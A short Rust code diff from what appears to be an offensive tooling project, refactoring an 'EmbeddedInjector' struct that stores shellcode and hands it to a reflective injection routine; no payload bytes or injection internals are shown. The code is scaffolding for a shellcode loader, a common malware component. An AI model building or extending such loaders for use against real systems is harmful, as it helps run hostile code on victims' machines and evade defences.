@@ -1,11 +1,12 @@
 use crate::injectors::{
     Injector,
     InjectorType,
+    InjectionType,
     InjectorError,
     reflective_inject
 };
 
-struct EmbeddedInjector {
+pub struct EmbeddedInjector {
     shellcode: Option<Vec<u8>>
 }
 
@@ -23,14 +24,14 @@ impl Injector for EmbeddedInjector {
             Embedded(sc) => {
                 Ok(EmbeddedInjector { shellcode: Some(sc) })
             }
-            _ => InjectorError("Incorrect Shellcode Type!".to_string())
+            _ => Err(InjectorError("Incorrect Shellcode Type!".to_string()))
         }
     }
 
-    unsafe fn inject(&self, wait: bool) {
+    fn inject(&self, injection_type: InjectionType, wait: bool) {
 
         match self.shellcode {
-            Some(sc) => reflective_inject(&self.shellcode, true),
+            Some(sc) => unsafe { reflective_inject(&self.shellcode, true) },
             None => panic!("No shellcode loaded!")
         }
         
